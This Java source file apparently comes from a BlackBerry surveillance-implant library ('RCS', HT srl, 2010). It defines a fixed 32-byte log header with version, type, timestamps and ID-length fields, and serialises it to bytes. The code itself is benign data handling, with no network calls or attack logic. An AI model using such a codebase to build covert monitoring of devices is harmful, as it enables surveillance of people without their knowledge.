/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : LogDescription.java 
 * Created      : 26-mar-2010
 * *************************************************/
package com.ht.rcs.blackberry.log;

import net.rim.device.api.util.DataBuffer;

import com.ht.rcs.blackberry.utils.Check;

public class LogDescription {
    public int version;
    public int logType;
    public int hTimeStamp;
    public int lTimeStamp;

    public int deviceIdLen;
    public int userIdLen;
    public int sourceIdLen;
    public int additionalData;

    public final int length = 32;

    public byte[] getBytes() {
        byte[] buffer = new byte[length];
        serialize(buffer, 0);
        // #ifdef DBC
//@        Check.ensures(buffer.length == length, "Wrong len");
        // #endif
        return buffer;
    }

    public void serialize(byte[] buffer, int offset) {
        DataBuffer databuffer = new DataBuffer(buffer, offset, length, false);
        databuffer.writeInt(version);
        databuffer.writeInt(logType);
        databuffer.writeInt(hTimeStamp);
        databuffer.writeInt(lTimeStamp);

        databuffer.writeInt(deviceIdLen);
        databuffer.writeInt(userIdLen);
        databuffer.writeInt(sourceIdLen);
        databuffer.writeInt(additionalData);

    }
}
